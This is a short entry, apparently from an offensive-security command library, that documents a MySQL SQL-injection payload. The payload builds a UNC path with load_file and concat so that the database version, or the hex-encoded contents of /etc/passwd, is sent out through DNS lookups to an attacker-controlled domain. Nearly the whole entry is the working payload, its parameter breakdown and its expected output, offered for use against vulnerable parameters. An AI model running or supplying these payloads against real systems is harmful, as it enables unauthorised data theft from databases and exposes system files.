---
type: command
executor: sql
data: |
  select load_file(concat('\\\\',version(),'.hacker.site\\a.txt'));
tags:
  - sql-injection
  - dns-exfiltration
platforms:
  - MySQL
verified: true
validated: true
---

# mysql-load-file-remote-server-concat

## Command

```sql
select load_file(concat('\\\\',version(),'.hacker.site\\a.txt'));
```

## Description

This SQL command injects into a MySQL query to load a file via a constructed UNC path, triggering a DNS resolution to exfiltrate data out-of-band. Use in a vulnerable parameter to leak database version or file contents via subdomain queries to an attacker-controlled DNS server.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `version()` | MySQL function to retrieve database version for testing exfiltration | No (replace with actual data extraction like `@@version` or file content) |
| `.hacker.site` | Attacker-controlled domain for DNS capture | Yes |
| `a.txt` | Target file name on 'remote' share (triggers resolution, not actual load) | Yes |
| `\\\\` | Escaped backslashes for UNC path (\\server\share) | Yes |

## Examples

### Basic Usage

```sql
select load_file(concat('\\\\',version(),'.attacker-dns.com\\test.txt'));
```

### Advanced Usage

To exfiltrate a specific file content (e.g., /etc/passwd, assuming readable):

```sql
select load_file(concat('\\\\',hex(load_file('/etc/passwd')),'.attacker-dns.com\\dummy'));
```
(Requires chunking large files with SUBSTRING for DNS limits.)

## Expected Output

Direct query response: Often NULL or error (e.g., "Can't find file"), as LOAD_FILE fails on UNC but triggers DNS. Success: DNS server logs query like "5.7.44.attacker-dns.com" revealing exfiltrated data.

## Related

- [[procedures/MySQL-SQL-Injection-for-Out-of-Band-DNS-Exfiltration]]
- [[commands/mysql-load-file-hexadecimal-values]]
